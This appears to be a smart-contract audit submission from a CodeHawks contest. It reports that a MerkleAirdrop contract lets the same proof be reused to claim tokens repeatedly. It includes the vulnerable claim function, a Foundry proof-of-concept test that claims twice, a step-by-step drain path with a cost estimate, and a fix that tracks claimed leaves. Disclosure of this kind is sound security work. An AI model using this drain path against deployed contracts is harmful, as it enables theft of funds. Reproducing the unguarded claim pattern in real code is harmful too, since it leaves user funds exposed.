## AirDropper
[https://codehawks.cyfrin.io/c/ai-airdropper-clk83mi5b0004jp08axr82nq1/s/1]

100
EXP

Jan 17th, 2026 → Jan 17th, 2026

## Submission Details
Severity: **High**

## Double-Claim Vulnerability in `MerkleAirdrop`

firmanregar

## Root + Impact Description
The `MerkleAirdrop` contract allows users to claim their airdrop allocation multiple times using the same Merkle proof. There is no on-chain state tracking which leaves have been claimed, enabling complete drainage of the airdrop funds.

Root cause: The `claim()` function verifies the Merkle proof but never marks the leaf as consumed.
```solidity
function claim(address account, uint256 amount, bytes32[] calldata merkleProof) external payable {
    if (msg.value != FEE) {
        revert MerkleAirdrop__InvalidFeeAmount();
    }
    bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(account, amount))));
    if (!MerkleProof.verify(merkleProof, i_merkleRoot, leaf)) {
        revert MerkleAirdrop__InvalidProof();
    }
    emit Claimed(account, amount);
    i_airdropToken.safeTransfer(account, amount);
}
```

## Risk
**Likelihood:**

After a successful claim, the contract state is unchanged - no mapping update, no bitmap modification, no nonce increment. The same (account, amount, merkleProof) tuple will verify successfully on subsequent calls.

**Impact:**

Direct impact:
* Complete loss of airdrop funds (100 USDC)
* Legitimate users unable to claim their allocation

Secondary effects:
* No recovery mechanism exists (no pause, no admin withdrawal)
* Contract becomes permanently insolvent
* Claimed events misleadingly suggest fair distribution occurred

## Proof of Concept
```solidity
function test_doubleClaim() public {
    // Setup: fund airdrop, prepare attacker
    deal(address(usdc), address(airdrop), 100e6);
    vm.deal(attacker, 1 ether);
​
    // First claim succeeds
    vm.prank(attacker);
    airdrop.claim{value: 1e9}(attacker, 25e6, validProof);
    
    assertEq(usdc.balanceOf(attacker), 25e6);
​
    // Second claim with identical parameters also succeeds
    vm.prank(attacker);
    airdrop.claim{value: 1e9}(attacker, 25e6, validProof);
    
    assertEq(usdc.balanceOf(attacker), 50e6); // Double the intended amount
    assertEq(usdc.balanceOf(address(airdrop)), 50e6); // Pool half-drained
}
```

**Attack path:**

Attacker calls `claim(account, 25e6, proof)` with 1e9 wei fee
Merkle proof verifies, 25 USDC transferred
Attacker calls claim(account, 25e6, proof) again with same parameters
Proof still verifies (root hasn't changed, leaf is identical)
Another 25 USDC transferred
Repeat until contract is drained

**Economic feasibility:**

Fee per claim: 1e9 wei (~$0.000003 at current ETH prices)
Tokens per claim: 25 USDC
Total airdrop: 100 USDC
Drain cost: 4 × 1e9 wei = ~$0.000012

## Recommended Mitigation
Add claim tracking using a mapping:
```solidity
mapping(bytes32 => bool) private claimed;
​
function claim(address account, uint256 amount, bytes32[] calldata merkleProof) external payable {
    if (msg.value != FEE) {
        revert MerkleAirdrop__InvalidFeeAmount();
    }
    
    bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(account, amount))));
    
    if (claimed[leaf]) {
        revert MerkleAirdrop__AlreadyClaimed();
    }
    
    if (!MerkleProof.verify(merkleProof, i_merkleRoot, leaf)) {
        revert MerkleAirdrop__InvalidProof();
    }
    
    claimed[leaf] = true;
    
    emit Claimed(account, amount);
    i_airdropToken.safeTransfer(account, amount);
}
```

For gas optimization with many eligible addresses, consider using a bitmap pattern similar to the Uniswap Merkle Distributor this contract is based on.
